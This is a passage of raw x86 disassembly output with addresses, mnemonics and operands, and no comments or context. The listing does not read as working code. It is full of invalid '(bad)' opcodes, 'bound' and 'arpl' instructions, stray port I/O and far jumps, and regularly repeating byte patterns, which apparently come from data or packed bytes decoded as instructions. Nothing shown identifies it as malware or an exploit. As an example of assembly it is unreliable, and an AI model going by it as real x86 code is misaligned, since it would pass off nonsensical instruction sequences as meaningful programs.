  40eee2:	js     0x40ef25
  40eee4:	inc    ecx
  40eee5:	bound  eax,QWORD PTR [eax-0x7c]
  40eee8:	add    DWORD PTR ds:0x398c4524,ecx
  40eeee:	sub    edx,ecx
  40eef0:	out    dx,eax
  40eef1:	inc    eax
  40eef2:	add    DWORD PTR [ecx],0x63
  40eef5:	ret    
  40eef6:	stc    
  40eef7:	mov    BYTE PTR [ebx+0x623c1f14],dl
  40eefd:	inc    eax
  40eefe:	add    eax,0x40430041
  40ef03:	inc    eax
  40ef04:	inc    ecx
  40ef05:	inc    eax
  40ef06:	inc    eax
  40ef07:	bound  eax,QWORD PTR ds:0x5624300
  40ef0d:	add    BYTE PTR [eax+0x40],al
  40ef10:	add    BYTE PTR [ecx+0x43],al
  40ef13:	add    BYTE PTR [eax+0x41],al
  40ef16:	add    eax,0x40436200
  40ef1b:	inc    eax
  40ef1c:	add    eax,0xfa2e5762
  40ef21:	arpl   WORD PTR [eax],bp
  40ef23:	inc    eax
  40ef24:	mov    DWORD PTR [edx+0x5b05a8be],eax
  40ef2a:	ins    BYTE PTR es:[edi],dx
  40ef2b:	or     BYTE PTR [ecx],al
  40ef2d:	imul   esi,DWORD PTR ds:0x43e04124,0x40
  40ef34:	sbb    DWORD PTR [ecx],edi
  40ef36:	inc    ebp
  40ef37:	sub    ah,BYTE PTR [ebx+0x42]
  40ef3a:	inc    eax
  40ef3b:	outs   dx,BYTE PTR ds:[esi]
  40ef3c:	mov    BYTE PTR [eax-0x2c],0x42
  40ef40:	inc    ecx
  40ef41:	inc    eax
  40ef42:	add    eax,0x41624340
  40ef47:	test   BYTE PTR [eax],al
  40ef49:	and    eax,0x404043
  40ef4e:	add    BYTE PTR ds:0x626210,al
  40ef54:	add    eax,0x43404140
  40ef59:	inc    eax
  40ef5a:	inc    ecx
  40ef5b:	add    eax,0x10664062
  40ef60:	inc    ebx
  40ef61:	(bad)  
  40ef62:	sar    BYTE PTR [esp],0x40
  40ef66:	or     DWORD PTR [esi+esi*4],esi
  40ef69:	or     BYTE PTR [ebx-0x7],ah
  40ef6c:	ins    BYTE PTR es:[edi],dx
  40ef6d:	push   cs
  40ef6e:	pop    edx
  40ef6f:	xor    WORD PTR [edi+eiz*1],di
  40ef73:	pop    ebx
  40ef74:	outs   dx,BYTE PTR ds:[esi]
  40ef75:	inc    eax
  40ef76:	add    DWORD PTR [ecx-0x7eee9c3f],0x413f0f43
  40ef80:	cmp    dh,BYTE PTR [eax+0x40c529f1]
  40ef86:	inc    ecx
  40ef87:	add    BYTE PTR [ecx*1+0x4041cc05],bh
  40ef8e:	add    BYTE PTR [eax],al
  40ef90:	add    BYTE PTR [eax+0x40],al
  40ef93:	inc    ebx
  40ef94:	bound  eax,QWORD PTR [eax]
  40ef96:	inc    eax
  40ef97:	inc    eax
  40ef98:	add    eax,0x62434162
  40ef9d:	inc    eax
  40ef9e:	js     0x40efb0
  40efa0:	inc    ecx
  40efa1:	add    eax,0x5404325
  40efa6:	bound  eax,QWORD PTR [eax+0x40]
  40efa9:	inc    ecx
  40efaa:	inc    ebx
  40efab:	imul   edx,DWORD PTR [edx],0x228009c4
  40efb1:	bound  edi,QWORD PTR [ebp-0x1d]
  40efb4:	in     eax,0x23
  40efb6:	inc    eax
  40efb7:	xor    edx,DWORD PTR [eax+0x4]
  40efba:	bound  ebx,QWORD PTR [eax+0x514d626]
  40efc0:	or     BYTE PTR [eax+0x76],0x56
  40efc4:	and    eax,0x436241
  40efc9:	adc    BYTE PTR [eax+0x0],al
  40efcc:	add    eax,0x62410040
  40efd1:	inc    eax
  40efd2:	add    BYTE PTR [ebx-0x34],al
  40efd5:	inc    eax
  40efd6:	add    eax,0x78434040
  40efdb:	bound  eax,QWORD PTR [ecx+0x78]
  40efde:	add    eax,0x62404043
  40efe3:	mov    ah,0x4a
  40efe5:	inc    eax
  40efe6:	xchg   ebp,eax
  40efe7:	bound  edx,QWORD PTR [edx+0x70]
  40efea:	hlt    
  40efeb:	in     eax,0x28
  40efed:	add    ebp,DWORD PTR [ebx]
  40efef:	pop    edx
  40eff0:	adc    ah,BYTE PTR [edx+0x12]
  40eff3:	lds    ebp,FWORD PTR [eax+0x40]
  40eff6:	add    eax,DWORD PTR [eax-0x58]
  40eff9:	and    ecx,ecx
  40effb:	inc    ebx
  40effc:	inc    ebx
  40effd:	adc    eax,0x40157d76
  40f002:	data16 sub al,0x40
  40f005:	inc    eax
  40f006:	(bad)  
  40f007:	ror    ebp,0x65
  40f00a:	inc    eax
  40f00b:	xchg   ecx,eax
  40f00c:	and    al,0x12
  40f00e:	inc    ecx
  40f00f:	add    BYTE PTR [ecx+0x50],0x40
  40f013:	test   al,0x6c
  40f015:	inc    eax
  40f016:	add    DWORD PTR [ecx],esp
  40f018:	xlat   BYTE PTR ds:[ebx]
  40f019:	inc    ecx
  40f01a:	inc    eax
  40f01b:	add    eax,0x43436240
  40f020:	add    eax,0x62004040
  40f025:	inc    eax
  40f026:	add    BYTE PTR [ecx+0x40],al
  40f029:	inc    ebx
  40f02a:	test   BYTE PTR ds:0x58054041,ah
  40f030:	inc    eax
  40f031:	inc    eax
  40f032:	bound  eax,QWORD PTR [eax+0x66]
  40f035:	inc    ecx
  40f036:	inc    eax
  40f037:	add    eax,0x10426100
  40f03c:	or     BYTE PTR [ecx*2-0x3002d7a0],dl
  40f043:	mov    eax,0x80034043
  40f048:	jnp    0x40efcd
  40f04a:	test   eax,0x6013c541
  40f04f:	and    ecx,DWORD PTR [ebp+ebx*1+0x40ef7cb0]
  40f056:	add    DWORD PTR [edx+0xb],eax
  40f059:	add    eax,DWORD PTR [ebx+0x44]
  40f05c:	push   ecx
  40f05d:	push   cs
  40f05e:	inc    DWORD PTR [eax]
  40f060:	test   BYTE PTR [edx+0x0],bh
  40f063:	add    BYTE PTR [ebx+0x40],al
  40f066:	bound  eax,QWORD PTR ds:0x25404110
  40f06c:	add    ah,cl
  40f06e:	inc    ebx
  40f06f:	add    eax,0x40402562
  40f074:	add    BYTE PTR [eax+0x40],al
  40f077:	inc    ecx
  40f078:	inc    ecx
  40f079:	add    eax,0x78434025
  40f07e:	bound  eax,QWORD PTR [eax-0x7c]
  40f081:	inc    eax
  40f082:	inc    ecx
  40f083:	jno    0x40f0ec
  40f085:	cld    
  40f086:	inc    eax
  40f087:	adc    WORD PTR ss:[eax+ecx*4+0x54],sp
  40f08d:	or     DWORD PTR fs:[edx+ebp*2],eax
  40f091:	pop    edx
  40f092:	(bad)  
  40f093:	bound  ebp,QWORD PTR fs:[eax]
  40f096:	inc    eax
  40f097:	adc    edx,edx
  40f099:	sub    eax,0x644d90a8
  40f09e:	pop    ds
  40f09f:	jle    0x40f023
  40f0a1:	cmp    BYTE PTR [edi+0x40436380],bh
  40f0a7:	add    al,0x7c
  40f0a9:	pop    eax
  40f0aa:	sub    ah,BYTE PTR [ecx+eax*2+0x40]
  40f0ae:	inc    eax
  40f0af:	inc    ebx
  40f0b0:	int3   
  40f0b1:	add    BYTE PTR ds:0x56240,al
  40f0b7:	inc    ebx
  40f0b8:	inc    eax
  40f0b9:	inc    eax
  40f0ba:	add    BYTE PTR [ecx+0x62],al
  40f0bd:	bound  eax,QWORD PTR [eax]
  40f0bf:	int3   
  40f0c0:	inc    eax
  40f0c1:	inc    ebx
  40f0c2:	add    eax,0x43624041
  40f0c7:	adc    BYTE PTR [ecx+0x5],al
  40f0ca:	inc    eax
  40f0cb:	jne    0x40f10d
  40f0cd:	adc    al,0x34
  40f0cf:	and    DWORD PTR [ebx-0x54],esp
  40f0d2:	jle    0x40f0f8
  40f0d4:	and    al,0x40
  40f0d6:	push   ss
  40f0d7:	xchg   ecx,eax
  40f0d8:	xchg   esp,eax
  40f0d9:	retf   
  40f0da:	add    BYTE PTR [edx+0x1f82106c],al
  40f0e0:	inc    ebx
  40f0e1:	adc    eax,0x4022204d
  40f0e6:	xor    ah,BYTE PTR [edx+0x43]
  40f0e9:	inc    eax
  40f0ea:	adc    BYTE PTR ds:0x4158cc40,al
  40f0f0:	inc    ebx
  40f0f1:	bound  eax,QWORD PTR [ecx+0x40]
  40f0f4:	add    eax,0x4140
  40f0f9:	and    eax,0x40400062
  40f0fe:	add    eax,0x84404340
  40f103:	int3   
  40f104:	js     0x40f106
  40f106:	inc    ecx
  40f107:	adc    BYTE PTR [edx+0xf],ah
  40f10a:	test   DWORD PTR ds:0x43fe5044,ecx
  40f110:	sbb    DWORD PTR ds:0xc7e681a,ebp
  40f116:	lods   eax,DWORD PTR ds:[esi]
  40f117:	lds    eax,FWORD PTR [eax+0x4]
  40f11a:	mov    ebx,DWORD PTR [ecx-0x7c]
  40f11d:	dec    edi
  40f11e:	out    dx,eax
  40f11f:	jmp    0x40f133
  40f121:	or     ebp,edx
  40f123:	inc    ebx
  40f124:	fld    QWORD PTR fs:[eax]
  40f127:	inc    eax
  40f128:	inc    ecx
  40f129:	inc    eax
  40f12a:	inc    ebx
  40f12b:	bound  ax,DWORD PTR ds:0x40434100
  40f132:	add    eax,0x40054062
  40f137:	bound  eax,QWORD PTR [ecx+0x40]
  40f13a:	inc    ebx
  40f13b:	inc    eax
  40f13c:	add    eax,0x25405841
  40f141:	bound  eax,QWORD PTR [eax+0x43]
  40f144:	inc    eax
  40f145:	adc    dl,bl
  40f147:	in     eax,dx
  40f148:	inc    eax
  40f149:	jmp    0xd27a:0x4c1a0d82
  40f150:	add    esp,DWORD PTR ds:0x60246a2f
  40f156:	shl    BYTE PTR [ebx-0xfb6fec0],1
  40f15c:	ins    BYTE PTR es:[edi],dx
  40f15d:	je     0x40f16f
  40f15f:	sub    BYTE PTR ds:0xb4940017,al
  40f165:	nop
  40f166:	nop
  40f167:	pusha  
  40f168:	inc    eax
  40f169:	add    DWORD PTR [eax+0x41],0x62054043
  40f170:	bound  eax,QWORD PTR [eax+0x43]
  40f173:	inc    ecx
  40f174:	adc    BYTE PTR [eax],al
  40f176:	inc    eax
  40f177:	add    eax,0x43000562
  40f17c:	add    BYTE PTR [ecx+0x40],al
  40f17f:	inc    eax
  40f180:	add    eax,0x400062
  40f185:	inc    ebx
  40f186:	inc    eax
  40f187:	js     0x40f1ca
  40f189:	inc    ecx
  40f18a:	bound  eax,QWORD PTR [eax-0x3]
  40f18d:	bound  eax,QWORD PTR ds:0x443efab
  40f193:	pusha  
  40f194:	outs   dx,DWORD PTR ds:[esi]
  40f195:	les    ecx,FWORD PTR [eax]
  40f197:	add    edx,ebx
  40f199:	inc    eax
  40f19a:	inc    eax
  40f19b:	add    eax,DWORD PTR [eax-0x23]
  40f19e:	jle    0x40f1f4
  40f1a0:	dec    ebx
  40f1a1:	and    al,0x40
  40f1a3:	or     BYTE PTR [ecx+edi*2+0x62],bh
  40f1a7:	inc    ecx
  40f1a8:	aam    0x6c
  40f1aa:	inc    eax
  40f1ab:	add    edx,DWORD PTR [ebx]
  40f1ad:	bound  ebx,QWORD PTR [ecx]
  40f1af:	pop    edi
  40f1b0:	(bad)  
  40f1b1:	cmp    al,0x14
  40f1b3:	dec    esp
  40f1b4:	test   DWORD PTR [edx+0x40],esp
  40f1b7:	add    eax,0x40430041
  40f1bc:	inc    eax
  40f1bd:	inc    ecx
  40f1be:	inc    eax
  40f1bf:	inc    eax
  40f1c0:	bound  eax,QWORD PTR ds:0x5624300
  40f1c6:	add    BYTE PTR [eax+0x40],al
  40f1c9:	add    BYTE PTR [ecx+0x43],al
  40f1cc:	add    BYTE PTR [eax+0x41],al
  40f1cf:	add    eax,0x40436200
  40f1d4:	inc    eax
  40f1d5:	add    eax,0x24a06062
  40f1da:	hlt    
  40f1db:	inc    ebx
  40f1dc:	inc    eax
  40f1dd:	add    DWORD PTR [eax],ebx
  40f1df:	mov    WORD PTR [edi+edx*1+0x40],fs
  40f1e3:	lds    ebx,FWORD PTR [eax]
  40f1e5:	arpl   WORD PTR [ebx],ax
  40f1e7:	arpl   WORD PTR [edi+0x40d16b4c],ax
  40f1ed:	sub    DWORD PTR [ebx-0x46],0xcead6247
  40f1f4:	adc    al,0x25
  40f1f6:	pop    es
  40f1f7:	inc    ebx
  40f1f8:	stos   DWORD PTR es:[edi],eax
  40f1f9:	nop
  40f1fa:	jae    0x40f195
  40f1fc:	inc    eax
  40f1fd:	sbb    DWORD PTR [esi+0x7d],0x4041fe00
  40f204:	add    eax,0x41624340
  40f209:	test   BYTE PTR [eax],al
  40f20b:	and    eax,0x404043
  40f210:	add    BYTE PTR ds:0x626210,al
  40f216:	add    eax,0x43404140
  40f21b:	inc    eax
  40f21c:	inc    ecx
  40f21d:	add    eax,0x10664062
  40f222:	inc    ebx
  40f223:	bound  ecx,QWORD PTR [eax-0x28]
  40f226:	outs   dx,BYTE PTR ds:[esi]
  40f227:	inc    ecx
  40f228:	xchg   BYTE PTR [edx+0x17],dh
  40f22b:	dec    edi
  40f22c:	sub    BYTE PTR [bx+si-0x7f],al
  40f230:	sub    ah,BYTE PTR es:[ebx+0x26]
  40f234:	sub    eax,0x5ebf0e5c
  40f239:	add    BYTE PTR ds:0x40430c70,0x3d
  40f240:	inc    eax
  40f241:	rol    DWORD PTR [edi-0x33fa9a80],0x41
  40f248:	inc    eax
  40f249:	add    BYTE PTR [eax],al
  40f24b:	add    BYTE PTR [eax+0x40],al
  40f24e:	inc    ebx
  40f24f:	bound  eax,QWORD PTR [eax]
  40f251:	inc    eax
  40f252:	inc    eax
  40f253:	add    eax,0x62434162
  40f258:	inc    eax
  40f259:	js     0x40f26b
  40f25b:	inc    ecx
  40f25c:	add    eax,0x5404325
  40f261:	bound  eax,QWORD PTR [eax+0x40]
  40f264:	inc    ecx
  40f265:	inc    ebx
  40f266:	inc    eax
  40f267:	(bad)  
  40f269:	mov    WORD PTR cs:[ecx-0x3d],cs
  40f26d:	cwde   
  40f26e:	and    al,0x40
  40f270:	add    ebp,DWORD PTR [ecx+0x62]
  40f273:	xor    al,0x44
  40f275:	or     eax,0x101096c
  40f27a:	inc    ebx
  40f27b:	inc    eax
  40f27c:	dec    eax
  40f27d:	leave  
  40f27e:	(bad)  
  40f27f:	inc    eax
  40f280:	pop    ebx
  40f281:	pop    ds
  40f282:	jl     0x40f2c6
  40f284:	loopne 0x40f271
  40f286:	inc    ebx
  40f287:	adc    al,0x84
  40f289:	add    esi,DWORD PTR [ebx+edx*2+0x1c]
  40f28d:	mov    ebx,0x602e40c5
  40f292:	bound  esp,QWORD PTR [eax]
  40f294:	dec    edi
  40f295:	fs test eax,0xf482cf03
  40f29b:	cmp    al,0xdd
  40f29d:	and    eax,0x436241
  40f2a2:	adc    BYTE PTR [eax+0x0],al
  40f2a5:	add    eax,0x62410040
  40f2aa:	inc    eax
  40f2ab:	add    BYTE PTR [ebx-0x34],al
  40f2ae:	inc    eax
  40f2af:	add    eax,0x78434040
  40f2b4:	bound  eax,QWORD PTR [ecx+0x78]
  40f2b7:	add    eax,0x62404043
  40f2bc:	add    BYTE PTR [edx+0x65220340],bh
  40f2c2:	sbb    BYTE PTR [edi-0x64],0x1f
  40f2c6:	adc    eax,0xc55860df
  40f2cb:	inc    ecx
  40f2cc:	add    eax,0x140ac
  40f2d1:	pop    ecx
  40f2d2:	xchg   edx,eax
  40f2d3:	mov    ebp,0x65122887
  40f2d8:	daa    
  40f2d9:	fnstsw WORD PTR [edi+0x40584077]
  40f2df:	add    edi,DWORD PTR [edx+0x40]
  40f2e2:	sbb    al,0x5
  40f2e4:	inc    edx
  40f2e5:	inc    ebx
  40f2e6:	adc    al,0x38
  40f2e8:	pop    ecx
  40f2e9:	clc    
  40f2ea:	adc    BYTE PTR [ecx-0x56],al
  40f2ed:	inc    eax
  40f2ee:	inc    eax
  40f2ef:	add    DWORD PTR [ecx+0x40],0x43624005
  40f2f6:	inc    ebx
  40f2f7:	add    eax,0x62004040
  40f2fc:	inc    eax
  40f2fd:	add    BYTE PTR [ecx+0x40],al
  40f300:	inc    ebx
  40f301:	test   BYTE PTR ds:0x58054041,ah
  40f307:	inc    eax
  40f308:	inc    eax
  40f309:	bound  eax,QWORD PTR [eax+0x66]
  40f30c:	inc    ecx
  40f30d:	inc    eax
  40f30e:	add    eax,0xcb590600
  40f313:	mov    ebp,0xaf13241c
  40f318:	sub    al,0x84
  40f31a:	mov    edi,0x406c626c
  40f31f:	or     dl,BYTE PTR [ecx]
  40f321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f322:	mov    edi,0xef06b1b
  40f327:	add    eax,DWORD PTR [eax-0xf578a78]
  40f32d:	dec    ebx
  40f32e:	inc    eax
  40f32f:	inc    ebx
  40f330:	xor    esp,DWORD PTR [ebx-0x77]
  40f333:	adc    dl,BYTE PTR [eax+0x7f0009c5]
  40f339:	inc    ecx
  40f33a:	test   al,0x55
  40f33c:	sub    cl,BYTE PTR [esi+0x40]
  40f33f:	sub    DWORD PTR [ebp+0x4aac],eax
  40f345:	inc    ebx
  40f346:	inc    eax
  40f347:	bound  eax,QWORD PTR ds:0x25404110
  40f34d:	add    ah,cl
  40f34f:	inc    ebx
  40f350:	add    eax,0x40402562
  40f355:	add    BYTE PTR [eax+0x40],al
  40f358:	inc    ecx
  40f359:	inc    ecx
  40f35a:	add    eax,0x78434025
  40f35f:	bound  eax,QWORD PTR [eax-0x7c]
  40f362:	inc    eax
  40f363:	inc    ecx
  40f364:	inc    ecx
  40f365:	(bad)  
  40f367:	pop    ds
  40f368:	int    0x1a
  40f36a:	inc    edi
  40f36b:	jne    0x40f3bc
  40f36d:	int    0x75
  40f36f:	inc    eax
  40f370:	add    al,ch
  40f372:	test   al,0xe4
  40f374:	mov    esp,0x2e141947
  40f379:	pop    edx
  40f37a:	adc    BYTE PTR [edx+0x47],ah
  40f37d:	sub    DWORD PTR [eax],ebp
  40f37f:	inc    eax
  40f380:	xor    al,0xc3
  40f382:	inc    ebx
  40f383:	pop    edx
  40f384:	clc    
  40f385:	ins    BYTE PTR es:[edi],dx
  40f386:	inc    ecx
  40f387:	inc    eax
  40f388:	inc    eax
  40f389:	inc    ebx
  40f38a:	int3   
  40f38b:	add    BYTE PTR ds:0x56240,al
  40f391:	inc    ebx
  40f392:	inc    eax
  40f393:	inc    eax
  40f394:	add    BYTE PTR [ecx+0x62],al
  40f397:	bound  eax,QWORD PTR [eax]
  40f399:	int3   
  40f39a:	inc    eax
  40f39b:	inc    ebx
  40f39c:	add    eax,0x43624041
  40f3a1:	adc    BYTE PTR [ecx+0x5],al
  40f3a4:	inc    eax
  40f3a5:	push   esp
  40f3a6:	adc    BYTE PTR [ebx-0x22d5ac55],al
  40f3ac:	inc    edi
  40f3ad:	add    DWORD PTR [eax+0x7d],eax
  40f3b0:	shl    DWORD PTR [edi+0x10],0x4c
  40f3b4:	xor    al,0x44
  40f3b6:	sbb    DWORD PTR [ebp+0x436253ef],eax
  40f3bc:	inc    eax
  40f3bd:	adc    BYTE PTR ds:0x4158cc40,al
  40f3c3:	inc    ebx
  40f3c4:	bound  eax,QWORD PTR [ecx+0x40]
  40f3c7:	add    eax,0x4140
  40f3cc:	and    eax,0x40400062
  40f3d1:	add    eax,0x84404340
  40f3d6:	int3   
  40f3d7:	js     0x40f3d9
  40f3d9:	inc    ecx
  40f3da:	adc    BYTE PTR [edx+0xf],ah
  40f3dd:	mov    esp,0x404e147d
  40f3e2:	lds    ebx,FWORD PTR [edx+0x69]
  40f3e5:	add    eax,0x12e80068
  40f3ea:	or     edx,eax
  40f3ec:	stc    
  40f3ed:	int    0xf
  40f3ef:	rol    DWORD PTR [eax],1
  40f3f1:	inc    eax
  40f3f2:	inc    ecx
  40f3f3:	inc    eax
  40f3f4:	inc    ebx
  40f3f5:	bound  ax,DWORD PTR ds:0x40434100
  40f3fc:	add    eax,0x40054062
  40f401:	bound  eax,QWORD PTR [ecx+0x40]
  40f404:	inc    ebx
  40f405:	inc    eax
  40f406:	add    eax,0x25405841
  40f40b:	bound  eax,QWORD PTR [eax+0x43]
  40f40e:	inc    eax
  40f40f:	adc    BYTE PTR [ebx+0x40],al
  40f412:	xchg   edi,eax
  40f413:	xor    esp,DWORD PTR [ebx+0x44]
  40f416:	fsubr  QWORD PTR [esi]
  40f418:	test   BYTE PTR [ebx],al
  40f41a:	arpl   WORD PTR [ecx+0x44],dx
  40f41d:	sub    al,BYTE PTR [esi+0x2c]
  40f420:	mov    al,BYTE PTR [eax+0xb]
  40f423:	rol    DWORD PTR [edi+0x40],0x44
  40f427:	outs   dx,BYTE PTR ds:[esi]
  40f428:	push   esi
  40f429:	add    eax,0x2ac11b69
  40f42e:	outs   dx,BYTE PTR ds:[esi]
  40f42f:	xor    cl,bl
  40f431:	inc    eax
  40f432:	or     ecx,eax
  40f434:	iret   
  40f435:	inc    edi
  40f436:	mov    eax,0x67049262
  40f43b:	xchg   BYTE PTR [eax+0x41403276],ch
  40f441:	inc    ebx
  40f442:	inc    eax
  40f443:	add    eax,0x43406262
  40f448:	inc    ecx
  40f449:	adc    BYTE PTR [eax],al
  40f44b:	inc    eax
  40f44c:	add    eax,0x43000562
  40f451:	add    BYTE PTR [ecx+0x40],al
  40f454:	inc    eax
  40f455:	add    eax,0x400062
  40f45a:	inc    ebx
  40f45b:	inc    eax
  40f45c:	js     0x40f49f
  40f45e:	inc    ecx
  40f45f:	bound  eax,QWORD PTR [eax+0x38]
  40f462:	and    eax,0x2ecd0140
  40f467:	fs pop ecx
  40f469:	test   eax,0x3f2a4001
  40f46e:	jp     0x40f4d5
  40f470:	bound  edi,QWORD PTR [ebp+esi*2+0x63c00540]
  40f477:	add    eax,DWORD PTR [esi+0x49242861]
  40f47d:	mov    dh,0xf4
  40f47f:	mov    esp,0x40500eb4
  40f484:	add    DWORD PTR [eax-0x48],eax
  40f487:	and    WORD PTR [edx+0x2],sp
  40f48b:	inc    eax
  40f48c:	push   0xfffffffc
  40f48e:	bound  edi,QWORD PTR [ebp+0x62]
  40f491:	inc    eax
  40f492:	add    eax,0x40430041
  40f497:	inc    eax
  40f498:	inc    ecx
  40f499:	inc    eax
  40f49a:	inc    eax
  40f49b:	bound  eax,QWORD PTR ds:0x5624300
  40f4a1:	add    BYTE PTR [eax+0x40],al
  40f4a4:	add    BYTE PTR [ecx+0x43],al
  40f4a7:	add    BYTE PTR [eax+0x41],al
  40f4aa:	add    eax,0x40436200
  40f4af:	inc    eax
  40f4b0:	add    eax,0xc903da62
  40f4b5:	inc    eax
  40f4b6:	add    ecx,DWORD PTR [edx+ecx*8]
  40f4b9:	jl     0x40f451
  40f4bb:	cmp    al,0x45
  40f4bd:	and    ecx,DWORD PTR [ecx+0x75]
  40f4c0:	cwde   
  40f4c1:	arpl   WORD PTR [ebx-0x7cbfbc03],bp
  40f4c7:	ret    
  40f4c8:	gs push cs
  40f4ca:	inc    edx
  40f4cb:	xchg   esp,eax
  40f4cc:	nop
  40f4cd:	inc    eax
  40f4ce:	dec    eax
  40f4cf:	push   eax
  40f4d0:	inc    esp
  40f4d1:	push   eax
  40f4d2:	enter  0x7070,0x40
  40f4d6:	add    bl,0x24
  40f4d9:	addr16 inc ecx
  40f4db:	add    esp,DWORD PTR [eax]
  40f4dd:	and    bh,BYTE PTR [edi+0x1d80c877]
  40f4e3:	fnsave [eax+eax*2+0x7306c124]
  40f4ea:	inc    ecx
  40f4eb:	inc    eax
  40f4ec:	add    eax,0x41624340
  40f4f1:	test   BYTE PTR [eax],al
  40f4f3:	and    eax,0x404043
  40f4f8:	add    BYTE PTR ds:0x626210,al
  40f4fe:	add    eax,0x43404140
  40f503:	inc    eax
  40f504:	inc    ecx
  40f505:	add    eax,0x10664062
  40f50a:	inc    ebx
  40f50b:	bound  ecx,QWORD PTR [esp+eiz*2]
  40f50e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f50f:	inc    eax
  40f510:	and    al,0x85
  40f512:	test   al,0x42
  40f514:	push   edx
  40f515:	xchg   esp,eax
  40f516:	test   al,0x40
  40f518:	add    ebx,eax
  40f51a:	adc    BYTE PTR [ecx+0x15],al
  40f51d:	inc    edx
  40f51e:	adc    DWORD PTR [ecx],esp
  40f520:	arpl   WORD PTR [esi-0x44],bp
  40f523:	cmp    ecx,ebx
  40f525:	push   eax
  40f526:	mov    esp,0x42c00140
  40f52b:	inc    edi
  40f52c:	jo     0x40f4f8
  40f52e:	or     eax,0x952e4340
  40f533:	clc    
  40f534:	and    al,0xcb
  40f537:	inc    eax
  40f538:	add    DWORD PTR [eax-0x78],ebx
  40f53b:	inc    edi
  40f53c:	add    eax,0x4041cc
  40f541:	add    BYTE PTR [eax],al
  40f543:	inc    eax
  40f544:	inc    eax
  40f545:	inc    ebx
  40f546:	bound  eax,QWORD PTR [eax]
  40f548:	inc    eax
  40f549:	inc    eax
  40f54a:	add    eax,0x62434162
  40f54f:	inc    eax
  40f550:	js     0x40f562
  40f552:	inc    ecx
  40f553:	add    eax,0x5404325
  40f558:	bound  eax,QWORD PTR [eax+0x40]
  40f55b:	inc    ecx
  40f55c:	inc    ebx
  40f55d:	ret    
  40f55e:	inc    ebp
  40f55f:	mov    ecx,0x63c16750
  40f564:	xor    eax,0x403a3c48
  40f569:	cmp    DWORD PTR ds:0xd24343cb,0x4d444065
  40f573:	cdq    
  40f574:	inc    edx
  40f575:	inc    ebp
  40f576:	retf   0x4094
  40f579:	add    eax,edx
  40f57b:	push   ebp
  40f57c:	dec    eax
  40f57d:	cmp    BYTE PTR [ecx+0x35204428],al
  40f583:	(bad)  
  40f584:	les    edi,FWORD PTR [ebx+0x4404c2a]
  40f58a:	and    eax,0x436241
  40f58f:	adc    BYTE PTR [eax+0x0],al
  40f592:	add    eax,0x62410040
  40f597:	inc    eax
  40f598:	add    BYTE PTR [ebx-0x34],al
  40f59b:	inc    eax
  40f59c:	add    eax,0x78434040
  40f5a1:	bound  eax,QWORD PTR [ecx+0x78]
  40f5a4:	add    eax,0x62404043
  40f5a9:	ror    BYTE PTR [edx],1
  40f5ab:	push   ecx
  40f5ac:	pushf  
  40f5ad:	imul   eax,DWORD PTR [edx],0x40
  40f5b0:	sub    cl,al
  40f5b2:	push   0xc9a85041
  40f5b7:	inc    eax
  40f5b8:	and    dl,BYTE PTR ds:[ebx+0x39]
  40f5bc:	(bad)  
  40f5bd:	push   ss
  40f5be:	mov    eax,0x50c34d43
  40f5c3:	inc    esi
  40f5c4:	pop    ecx
  40f5c5:	retf   
  40f5c6:	add    eax,0x15490240
  40f5cb:	clc    
  40f5cc:	dec    esp
  40f5cd:	retf   
  40f5ce:	retf   
  40f5cf:	inc    eax
  40f5d0:	es (bad) 
  40f5d2:	retf   
  40f5d3:	dec    ecx
  40f5d4:	jge    0x40f5fd
  40f5d6:	dec    edi
  40f5d7:	inc    eax
  40f5d8:	inc    ecx
  40f5d9:	sub    eax,0x40054041
  40f5de:	bound  eax,QWORD PTR [ebx+0x43]
  40f5e1:	add    eax,0x62004040
  40f5e6:	inc    eax
  40f5e7:	add    BYTE PTR [ecx+0x40],al
  40f5ea:	inc    ebx
  40f5eb:	test   BYTE PTR ds:0x58054041,ah
  40f5f1:	inc    eax
  40f5f2:	inc    eax
  40f5f3:	bound  eax,QWORD PTR [eax+0x66]
  40f5f6:	inc    ecx
  40f5f7:	inc    eax
  40f5f8:	add    eax,0x77354100
  40f5fd:	and    DWORD PTR [edi+0x42],eax
  40f600:	add    DWORD PTR [ebp+0x2a],0x2c647c42
  40f607:	inc    eax
  40f608:	pop    ebx
  40f609:	shl    DWORD PTR [ebp+0x42],0x34
  40f60d:	cmp    DWORD PTR [ebp+0x40],edx
  40f610:	add    cl,dh
  40f612:	inc    ebx
  40f613:	dec    eax
  40f614:	inc    ebx
  40f615:	test   al,0xcb
  40f617:	inc    eax
  40f618:	xor    eax,ebx
  40f61a:	xor    esp,eax
  40f61c:	mov    edx,0x87414811
  40f621:	sti    
  40f622:	in     al,dx
  40f623:	pusha  
  40f624:	push   0x48
  40f626:	inc    eax
  40f627:	inc    eax
  40f628:	ret    
  40f629:	dec    esp
  40f62a:	bound  eax,QWORD PTR [ecx-0x76]
  40f62d:	add    BYTE PTR [eax],al
  40f62f:	inc    ebx
  40f630:	inc    eax
  40f631:	bound  eax,QWORD PTR ds:0x25404110
  40f637:	add    ah,cl
  40f639:	inc    ebx
  40f63a:	add    eax,0x40402562
  40f63f:	add    BYTE PTR [eax+0x40],al
  40f642:	inc    ecx
  40f643:	inc    ecx
  40f644:	add    eax,0x78434025
  40f649:	bound  eax,QWORD PTR [eax-0x7c]
  40f64c:	inc    eax
  40f64d:	inc    ecx
  40f64e:	inc    ecx
  40f64f:	daa    
  40f650:	inc    eax
  40f651:	fadd   st(0),st
  40f653:	push   edx
  40f654:	cmp    DWORD PTR [ebx],edi
  40f656:	xor    al,0x6c
  40f658:	inc    eax
  40f659:	ret    0x2460
  40f65c:	inc    ebp
  40f65d:	test   al,0xf0
  40f65f:	dec    edx
  40f660:	inc    ecx
  40f661:	adc    al,0x56
  40f663:	lds    eax,FWORD PTR [esi+0x12]
  40f666:	bound  eax,QWORD PTR [esi+0x40]
  40f669:	test   al,0xe8
  40f66c:	mov    DWORD PTR [ebx+0x72],ecx
  40f66f:	leave  
  40f670:	inc    eax
  40f671:	(bad)  
  40f672:	sub    DWORD PTR [eax-0x9a7bd95],ebp
  40f678:	inc    eax
  40f679:	les    eax,FWORD PTR [edx+0x42]
  40f67c:	stos   DWORD PTR es:[edi],eax
  40f67d:	adc    DWORD PTR [edx+0xc],esp
  40f680:	inc    ebx
  40f681:	and    DWORD PTR [ecx+0x40],eax
  40f684:	inc    eax
  40f685:	inc    ebx
  40f686:	int3   
  40f687:	add    BYTE PTR ds:0x56240,al
  40f68d:	inc    ebx
  40f68e:	inc    eax
  40f68f:	inc    eax
